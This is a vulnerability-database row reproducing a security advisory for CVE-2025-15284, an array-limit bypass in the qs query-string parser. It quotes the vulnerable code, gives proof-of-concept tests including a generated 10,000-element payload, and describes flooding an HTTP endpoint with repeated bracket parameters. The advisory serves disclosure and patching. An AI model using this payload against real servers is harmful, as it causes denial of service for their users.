| 50 | CVE-2025-15284 | 7.5  | HIGH | Improper Input Validation vulnerability in qs (parse modules) allows HTTP DoS.This issue affects qs: < 6.14.1.SummaryThe arrayLimit option in qs does not enforce limits for bracket notation (a[]=1&a[]=2), allowing attackers to cause denial-of-service via memory exhaustion. Applications using arrayLimit for DoS protection are vulnerable.DetailsThe arrayLimit option only checks limits for indexed notation (a[0]=1&a[1]=2) but completely bypasses it for bracket notation (a[]=1&a[]=2).Vulnerable code (lib/parse.js:159-162):if (root === `[]` && options.parseArrays) {    obj = utils.combine([], leaf);  // No arrayLimit check}Working code (lib/parse.js:175):else if (index <= options.arrayLimit) {  // Limit checked here    obj = [];    obj[index] = leaf;}The bracket notation handler at line 159 uses utils.combine([], leaf) without validating against options.arrayLimit, while indexed notation at line 175 checks index <= options.arrayLimit before creating arrays.PoCTest 1 - Basic bypass:npm install qsconst qs = require(`qs`);const result = qs.parse(`a[]=1&a[]=2&a[]=3&a[]=4&a[]=5&a[]=6`, { arrayLimit: 5 });console.log(result.a.length);  // Output: 6 (should be max 5)Test 2 - DoS demonstration:const qs = require(`qs`);const attack = `a[]=` + Array(10000).fill(`x`).join(`&a[]=`);const result = qs.parse(attack, { arrayLimit: 100 });console.log(result.a.length);  // Output: 10000 (should be max 100)Configuration:  *  arrayLimit: 5 (test 1) or arrayLimit: 100 (test 2)  *  Use bracket notation: a[]=value (not indexed a[0]=value)ImpactDenial of Service via memory exhaustion. Affects applications using qs.parse() with user-controlled input and arrayLimit for protection.Attack scenario:  *  Attacker sends HTTP request: GET /api/search?filters[]=x&filters[]=x&...&filters[]=x (100,000+ times)  *  Application parses with qs.parse(query, { arrayLimit: 100 })  *  qs ignores limit, parses all 100,000 elements into array  *  Server memory exhausted → application crashes or becomes unresponsive  *  Service unavailable for all usersReal-world impact:  *  Single malicious request can crash server  *  No authentication required  *  Easy to automate and scale  *  Affects any endpoint parsing query strings with bracket notation | [1]https://github.com/ljharb/qs/commit/3086902ecf7f088d0d1803887643ac6c03d415b9<br>[2]https://github.com/ljharb/qs/security/advisories/GHSA-6rw7-vpxm-498p |
